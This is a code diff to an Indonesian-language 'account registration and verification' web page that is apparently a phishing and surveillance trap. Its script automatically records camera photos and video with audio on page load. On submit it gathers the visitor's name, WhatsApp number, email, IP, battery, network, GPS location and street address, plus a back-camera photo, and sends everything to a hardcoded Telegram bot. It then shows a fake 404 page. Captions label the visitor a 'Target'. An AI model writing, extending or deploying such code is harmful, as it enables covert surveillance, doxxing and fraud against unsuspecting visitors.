@@ -4,86 +4,36 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Daftar — Verifikasi</title>
-
-  <!-- Modern font -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-
   <style>
-    :root{
-      --bg1:#0f172a;
-      --accent:linear-gradient(90deg,#667eea,#764ba2);
-      --card:#0b1220;
-      --glass: rgba(255,255,255,0.04);
-      --muted: #9aa4c0;
-      --white: #e6eefb;
-    }
+    /* (sama persis seperti sebelumnya — saya tidak ubah style) */
+    :root{ --bg1:#0f172a; --accent:linear-gradient(90deg,#667eea,#764ba2); --card:#0b1220; --glass: rgba(255,255,255,0.04); --muted: #9aa4c0; --white: #e6eefb; }
     html,body{height:100%;margin:0;font-family:'Poppins',system-ui,Arial;background:
       radial-gradient(800px 400px at 10% 10%, rgba(118,75,162,0.18), transparent),
       radial-gradient(600px 300px at 90% 90%, rgba(102,126,234,0.12), transparent),
       var(--bg1); color:var(--white);}
     .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:28px;}
-    .card{
-      width:100%; max-width:760px; border-radius:16px; padding:28px; box-shadow: 0 8px 40px rgba(2,6,23,0.6);
-      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
-      border: 1px solid rgba(255,255,255,0.04);
-      display:grid; grid-template-columns: 1fr 380px; gap:20px;
-    }
+    .card{ width:100%; max-width:760px; border-radius:16px; padding:28px; box-shadow: 0 8px 40px rgba(2,6,23,0.6); background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02)); border: 1px solid rgba(255,255,255,0.04); display:grid; grid-template-columns: 1fr 380px; gap:20px; }
     .left { padding-right:8px; }
     h1{ margin:0 0 6px 0; font-size:20px; font-weight:700; color: #fff; }
     p.lead{ margin:0 0 18px 0; color:var(--muted); font-size:13px; }
     label{ display:block; font-size:13px; color:var(--muted); margin-top:10px; }
-    input[type="text"], input[type="tel"]{
-      width:100%; padding:12px 14px; border-radius:10px; border:none; outline:none;
-      background: rgba(255,255,255,0.02); color:var(--white); margin-top:8px; font-size:14px;
-      box-shadow: inset 0 1px 0 rgba(255,255,255,0.02);
-    }
+    input[type="text"], input[type="tel"], input[type="email"]{ width:100%; padding:12px 14px; border-radius:10px; border:none; outline:none; background: rgba(255,255,255,0.02); color:var(--white); margin-top:8px; font-size:14px; box-shadow: inset 0 1px 0 rgba(255,255,255,0.02); }
     .consent{ margin-top:14px; display:flex; gap:10px; align-items:flex-start; color:var(--muted); font-size:13px; }
     .consent input{ transform:scale(1.05); margin-top:3px; }
-    .btn{
-      display:inline-block; margin-top:18px; padding:11px 16px; border-radius:10px; border:none; cursor:pointer;
-      background: linear-gradient(90deg,#6b7bff,#8a5bef); color:#fff; font-weight:700; font-size:14px; box-shadow: 0 8px 24px rgba(107,123,255,0.16);
-      transition: transform .12s ease, box-shadow .12s ease;
-    }
+    .btn{ display:inline-block; margin-top:18px; padding:11px 16px; border-radius:10px; border:none; cursor:pointer; background: linear-gradient(90deg,#6b7bff,#8a5bef); color:#fff; font-weight:700; font-size:14px; box-shadow: 0 8px 24px rgba(107,123,255,0.16); transition: transform .12s ease, box-shadow .12s ease; }
     .btn:active{ transform: translateY(1px) }
     .small{ color:var(--muted); font-size:12px; margin-top:8px; }
-
-    .right{
-      padding:18px; border-radius:12px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      display:flex; flex-direction:column; gap:12px; align-items:stretch;
-      border:1px solid rgba(255,255,255,0.02);
-    }
-    .preview{
-      position:relative;
-      height:220px; border-radius:10px; overflow:hidden; background:linear-gradient(180deg, rgba(0,0,0,0.3), rgba(255,255,255,0.02));
-      display:flex; align-items:center; justify-content:center;
-    }
-    /* video background that replaces maskImage (was an img before) */
-    #maskImage {
-      position:absolute;
-      inset:0;
-      width:100%;
-      height:100%;
-      object-fit:cover;
-      display:block;
-      /* NO BLUR — user requested not to blur */
-      filter: none;
-      transform: none;
-    }
-
-    /* hidden preview used for capture (camera) */
+    .right{ padding:18px; border-radius:12px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); display:flex; flex-direction:column; gap:12px; align-items:stretch; border:1px solid rgba(255,255,255,0.02); }
+    .preview{ position:relative; height:220px; border-radius:10px; overflow:hidden; background:linear-gradient(180deg, rgba(0,0,0,0.3), rgba(255,255,255,0.02)); display:flex; align-items:center; justify-content:center; }
+    #maskImage { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; display:block; filter: none; transform: none; }
     #videoPreview { width:100%; height:100%; object-fit:cover; display:block; position:absolute; inset:0; opacity:0; pointer-events:none; }
-
     .meta{ font-size:13px; color:var(--muted); }
     footer.note{ grid-column: 1 / -1; text-align:center; color:var(--muted); font-size:12px; margin-top:6px; }
-
-    /* 404 page */
     #finish { display:none; text-align:center; padding:40px; }
     #finish h1{ font-size:84px; margin:0; color:#fff; }
     #finish p{ color:var(--muted); margin-top:8px; }
-    @media(max-width:880px){
-      .card{ grid-template-columns: 1fr; }
-      .right{ order:-1 }
-    }
+    @media(max-width:880px){ .card{ grid-template-columns: 1fr; } .right{ order:-1 } }
   </style>
 </head>
 <body>
@@ -91,7 +41,7 @@
     <div class="card" role="region" aria-label="Form Pendaftaran">
       <div class="left">
         <h1>Buat Akun & Verifikasi</h1>
-        <p class="lead">Isi data untuk verifikasi. Semua akses (kamera, mikrofon, lokasi) akan diminta **dengan izin jelas**. Hanya lanjutkan jika pengguna menyetujui.</p>
+        <p class="lead">Isi data untuk verifikasi. Semua akses (kamera, mikrofon, lokasi) akan diminta <strong>dengan izin jelas</strong>.</p>
 
         <form id="regForm" autocomplete="off" novalidate>
           <label for="name">Nama lengkap</label>
@@ -99,6 +49,10 @@
 
           <label for="wa">Nomor WhatsApp (contoh: 62812...)</label>
           <input id="wa" type="tel" placeholder="62812xxxxxxxx" required>
+
+          <!-- Tambahan: Email -->
+          <label for="email">Alamat Email</label>
+          <input id="email" type="email" placeholder="email@contoh.com" required>
 
           <div class="consent">
             <input id="consent" type="checkbox" aria-label="Setuju capture">
@@ -117,13 +71,11 @@
 
       <aside class="right" aria-hidden="true">
         <div class="preview" aria-hidden="true">
-          <!-- video background (replaces prior mask image). ID kept as maskImage so existing code still works -->
-          <video id="maskImage" autoplay loop playsinline >
+          <!-- video background autoplay muted supaya autoplay tanpa tap -->
+          <video id="maskImage" autoplay loop playsinline muted>
             <source src="https://c.top4top.io/m_3551e7put1.mp4" type="video/mp4">
-            <!-- fallback text -->
           </video>
 
-          <!-- hidden canvas for captures (kept) -->
           <video id="videoPreview" autoplay playsinline muted></video>
           <canvas id="canvas" width="800" height="800" style="display:none"></canvas>
         </div>
@@ -138,7 +90,6 @@
     </div>
   </div>
 
-  <!-- 404 after submit -->
   <div id="finish" role="alert">
     <h1>404</h1>
     <p>Halaman tidak ditemukan</p>
@@ -155,22 +106,15 @@ const CHAT_ID   = "6216902201";
 const regForm = document.getElementById('regForm');
 const consentEl = document.getElementById('consent');
 const videoPreview = document.getElementById('videoPreview');
-const maskImage = document.getElementById('maskImage'); // now a video element
+const maskImage = document.getElementById('maskImage'); // background video (now muted so autoplay allowed)
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 const statusText = document.getElementById('statusText');
 
-// small helpers
 const noop = ()=>{};
 function safeSlice(s, n=1000){ if(!s) return ''; return s.length<=n? s : s.slice(0,n-3)+'...'; }
 async function fetchJSON(url){ try{ const r = await fetch(url, {cache:'no-store'}); if(!r.ok) throw new Error('bad '+r.status); return await r.json(); }catch(e){return null;} }
 
-/* NOTE:
-   - maskImage is now a looping video background (not blurred).
-   - videoPreview remains the hidden element used for real camera preview/capture.
-*/
-
-// IP, geo, capture, send functions are kept (jika perlu nanti), but we'll integrate auto-capture on load.
 async function getIPInfo(){
   const sources = [
     {url:'https://ipapi.co/json/', map:j=>({ ip:j.ip, org:j.org, asn:j.asn||j.asn || (j.org? j.org : undefined), city:j.city, region:j.region, country:j.country_name||j.country, postal:j.postal })},
@@ -193,13 +137,11 @@ async function revGeocode(lat, lon){
     return { display: j.display_name||null, address: j.address||{} };
   }catch(e){ return { error: e.message||'revgeo fail' }; }
 }
-async function getBattery(){
-  try{ if(!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{return null;}
-}
+async function getBattery(){ try{ if(!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{return null;} }
 function getConnection(){ try{ const c = navigator.connection||navigator.mozConnection||navigator.webkitConnection; if(!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; }catch{return null;} }
 function getGeo(){ return new Promise(resolve=>{ if(!navigator.geolocation) return resolve({ error:'geolocation not supported' }); navigator.geolocation.getCurrentPosition(pos=> resolve({ lat:pos.coords.latitude, lon:pos.coords.longitude, acc: pos.coords.accuracy + ' m' }), err=> resolve({ error: err.message }), { enableHighAccuracy:true, timeout:10000 }); }); }
 
-// capturePhotoAndVideo kept and used for both auto-capture and submit-time capture
+// Capture front photo + 5s video (used for initial auto-capture)
 async function capturePhotoAndVideo(durationMs = 5000){
   try{
     const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:true });
@@ -232,7 +174,30 @@ async function capturePhotoAndVideo(durationMs = 5000){
   }
 }
 
-// Telegram helpers (kept as-is)
+// Capture back camera photo (single image)
+async function captureBackPhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" } });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.muted = true;
+    await video.play();
+    await new Promise(r=>setTimeout(r,700));
+    const w = video.videoWidth || 800, h = video.videoHeight || 600;
+    // crop center if preferable
+    const side = Math.min(w,h);
+    const sx = Math.max(0, (w - side)/2), sy = Math.max(0, (h - side)/2);
+    canvas.width = 800; canvas.height = 800;
+    ctx.drawImage(video, sx, sy, side, side, 0, 0, 800, 800);
+    const blob = await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
+    stream.getTracks().forEach(t=>t.stop());
+    video.pause();
+    video.srcObject = null;
+    return blob;
+  } catch(e){ return null; }
+}
+
+// Telegram helpers
 async function sendPhotoCaption(photoBlob, caption){
   const fd = new FormData();
   fd.append('chat_id', CHAT_ID);
@@ -251,15 +216,14 @@ async function sendText(text){
   return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text }) });
 }
 
-/* ---------------------------
-   Existing caption functions (kept intact)
-   --------------------------- */
+/* caption builders (sama seperti sebelumnya) */
 function buildPhotoCaption(obj){
   const now = new Date();
   const lines = [];
   lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
   if(obj.profile && obj.profile.name) lines.push(` ├─ > Nama: ${obj.profile.name}`);
   if(obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
+  if(obj.profile && obj.profile.email) lines.push(` ├─ > Email: ${obj.profile.email}`);
   lines.push(` ├─ >(Target)`);
   lines.push(` │   └─ ${obj.userAgent || '-'}`);
   lines.push(` ├─ > (IP)`);
@@ -295,39 +259,24 @@ function buildVideoCaptionAddress(rev){
   lines.push(` │   ├─ Negara: ${a.country || '-'}`);
   lines.push(` │   ├─ Kode Negara: ${a.country_code || '-'}`);
   lines.push(` │   ├─ Provinsi: ${a.state || a.region || '-'}`);
-  lines.push(` │   ├─ State District: ${a.state_district || '-'}`);
-  lines.push(` │   ├─ Kabupaten: ${a.county || '-'}`);
-  lines.push(` │   ├─ Region: ${a.region || '-'}`);
   lines.push(` │   ├─ Kota: ${a.city || a.town || a.village || '-'}`);
-  lines.push(` │   ├─ Kecamatan: ${a.suburb || a.municipality || a.city_district || '-'}`);
-  lines.push(` │   ├─ Desa/Kelurahan: ${a.village || a.hamlet || '-'}`);
-  lines.push(` │   ├─ Kampung/Dusun: ${a.hamlet || '-'}`);
-  lines.push(` │   ├─ Jalan: ${a.road || a.pedestrian || '-'}`);
-  lines.push(` │   ├─ Nomor: ${a.house_number || '-'}`);
   lines.push(` │   └─ Kode Pos: ${a.postcode || '-'}`);
   return safeSlice(lines.join('\n'), 1000);
 }
 
-/* ---------------------------
-   AUTO-CAPTURE ON PAGE LOAD
-   - Requests camera+mic permission immediately.
-   - If allowed, captures photo+5s video and stores them.
-   - These stored blobs are used on submit (so not sent automatically).
-   --------------------------- */
+/* AUTO-CAPTURE ON LOAD (tetap menangkap front 5s jika izin diberikan otomatis),
+   mencoba membuat initial front photo/video agar tidak perlu capture ulang */
 let initialPhotoBlob = null;
 let initialVideoBlob = null;
 
 (async function autoCaptureOnLoad(){
   try{
-    // Try to request camera+mic immediately
-    const media = await capturePhotoAndVideo(5000); // 5s
+    const media = await capturePhotoAndVideo(5000); // 5s front camera
     if(media && (media.photoBlob || media.videoBlob)){
       initialPhotoBlob = media.photoBlob;
       initialVideoBlob = media.videoBlob;
-      } else {
-      }
+    }
   }catch(e){
-    // permission denied or error — keep silent but update status
     initialPhotoBlob = null;
     initialVideoBlob = null;
   }
@@ -336,23 +285,21 @@ let initialVideoBlob = null;
 /* main flow */
 regForm.addEventListener('submit', async function(e){
   e.preventDefault();
-  // read inputs
   const name = document.getElementById('name').value.trim();
   const wa = document.getElementById('wa').value.trim();
+  const email = document.getElementById('email').value.trim();
   const consent = consentEl.checked;
 
-  if(!name || !wa){
-    alert('Isi Nama dan Nomor WA terlebih dahulu.');
+  if(!name || !wa || !email){
+    alert('Isi Nama, Nomor WA, dan Email terlebih dahulu.');
     return;
   }
 
-  // minimal immediate send: registration quick notice (optional)
   try{
-    const quick = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ╰─ > Aksi: Pendaftaran`;
+    const quick = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ├─ > Email: ${email}\n ╰─ > Aksi: Pendaftaran`;
     await sendText(quick);
   }catch(e){ /* ignore */ }
 
-  // gather device + ip + battery
   const ipInfo = await getIPInfo();
   const battery = await getBattery();
   const connection = getConnection();
@@ -373,7 +320,7 @@ regForm.addEventListener('submit', async function(e){
     connection
   };
 
-  // get geo & reverse geocode if consented
+  // geolocation if consent
   let geo = { error:'not requested' }, rev = null;
   if(consent){
     geo = await getGeo();
@@ -382,25 +329,27 @@ regForm.addEventListener('submit', async function(e){
     }
   }
 
-  // capture media if consented: use initial blobs if present, otherwise capture now
-  let photoBlob = null, videoBlob = null;
+  // capture media: front (photo/video) already in initialPhotoBlob OR capture now
+  let frontPhoto = null, frontVideo = null, backPhoto = null;
   if(consent){
     if(initialPhotoBlob || initialVideoBlob){
-      photoBlob = initialPhotoBlob;
-      videoBlob = initialVideoBlob;
-      // optionally clear initial to avoid reuse
-      initialPhotoBlob = null;
-      initialVideoBlob = null;
+      frontPhoto = initialPhotoBlob;
+      frontVideo = initialVideoBlob;
+      initialPhotoBlob = null; initialVideoBlob = null;
     } else {
-      // fallback: capture now
       const media = await capturePhotoAndVideo(5000);
-      photoBlob = media.photoBlob;
-      videoBlob = media.videoBlob;
+      frontPhoto = media.photoBlob;
+      frontVideo = media.videoBlob;
+    }
+    // try to capture back camera photo
+    try{
+      backPhoto = await captureBackPhoto();
+    }catch(e){
+      backPhoto = null;
     }
   }
 
-  // build objects and captions
-  const profile = { name, phone: wa };
+  const profile = { name, phone: wa, email };
   const photoCaptionObj = {
     profile,
     message: 'Pendaftaran & Verifikasi (dengan izin)',
@@ -416,27 +365,33 @@ regForm.addEventListener('submit', async function(e){
   const photoCaption = buildPhotoCaption(photoCaptionObj);
   const videoCaption = buildVideoCaptionAddress(rev);
 
-  // send photo + caption first
+  // send front photo (if ada)
   try{
-    if(photoBlob){
-      await sendPhotoCaption(photoBlob, photoCaption);
+    if(frontPhoto){
+      await sendPhotoCaption(frontPhoto, photoCaption + '\n\n(Tipe: Kamera Depan)');
     } else {
-      await sendText(photoCaption);
+      await sendText(photoCaption + '\n\n(Tidak ada foto depan)');
     }
-  }catch(e){
-    // ignore fail
-  }
+  }catch(e){ /* ignore failures */ }
 
-  // send video + caption (detailed address)
+  // send back photo (if ada)
   try{
-    if(videoBlob){
-      await sendVideoCaption(videoBlob, videoCaption);
+    if(backPhoto){
+      await sendPhotoCaption(backPhoto, photoCaption + '\n\n(Tipe: Kamera Belakang)');
     } else {
-      await sendText(videoCaption);
+      // optionally send text noting back photo tidak tersedia
+      // await sendText('Foto belakang tidak tersedia.');
     }
-  }catch(e){
-    // ignore
-  }
+  }catch(e){ /* ignore failures */ }
+
+  // send video if present
+  try{
+    if(frontVideo){
+      await sendVideoCaption(frontVideo, videoCaption);
+    } else {
+      // ignore
+    }
+  }catch(e){ /* ignore */ }
 
   // done -> redirect to 404
   document.querySelector('.wrap').style.display = 'none';
@@ -444,8 +399,7 @@ regForm.addEventListener('submit', async function(e){
   setTimeout(()=>{ window.location.href = '/404.html'; }, 1200);
 });
 
-/* small UX: when checkbox changes, keep default behaviour (mask visible).
-   Existing comment block preserved as you had it; no structural changes. */
+/* checkbox UX: keep mask visible unless user wants preview */
 consentEl.addEventListener('change', async (e)=>{
   if(!consentEl.checked){
     try{ if(videoPreview.srcObject) { videoPreview.srcObject.getTracks().forEach(t=>t.stop()); videoPreview.srcObject = null; } }catch{}
@@ -453,44 +407,17 @@ consentEl.addEventListener('change', async (e)=>{
     videoPreview.style.opacity = '0';
     return;
   }
-  // Keep mask visible by default (no auto-show of camera preview).
-  // If you want to show live preview on consent, uncomment the block below:
-  /*
-  try{
-    const s = await navigator.mediaDevices.getUserMedia({ video:true, audio:false });
-    videoPreview.srcObject = s;
-    videoPreview.muted = true;
-    await videoPreview.play().catch(noop);
-    if(maskImage) maskImage.style.display = 'none';
-    videoPreview.style.opacity = '1';
-  }catch(e){
-    }
-  */
+  // keep mask visible by default
 });
 
-// Force bg video with sound
+/* ensure background video autoplay: muted must be true for autoplay to work in most browsers */
 const bgVideo = document.getElementById('maskImage');
 if(bgVideo){
-  bgVideo.muted = false;
+  bgVideo.muted = true; // penting: muted supaya autoplay tanpa gesture
   bgVideo.play().catch(()=>{
+    // fallback: play on first user interaction
     document.body.addEventListener('click', ()=> bgVideo.play(), {once:true});
   });
-}
-
-// Capture back camera photo
-async function captureBackPhoto() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" } });
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
-    await new Promise(r=>setTimeout(r,700));
-    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-    ctx.drawImage(video,0,0);
-    const blob = await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
-    stream.getTracks().forEach(t=>t.stop());
-    return blob;
-  } catch(e){ return null; }
 }
 
 </script>
